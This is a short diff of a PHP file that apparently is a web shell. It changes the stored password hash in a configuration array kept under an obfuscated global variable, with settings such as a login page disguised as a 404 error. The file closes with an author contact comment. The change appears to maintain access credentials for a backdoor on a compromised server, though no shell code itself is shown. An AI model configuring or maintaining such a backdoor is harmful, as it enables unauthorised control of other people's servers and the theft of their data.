@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'kucrut',
-    'password' => 'e6f65b162ab1f8e87b81b8bcff95c7e5',
+    'password' => '236bf179941ee76fe523007331114515',
     'safe_mode' => '1',
     'login_page' => '404',
     'show_icons' => '1',
@@ -6480,3 +6480,4 @@ exit;
 #skype : ehsan.invisible
 */
 ?>
+
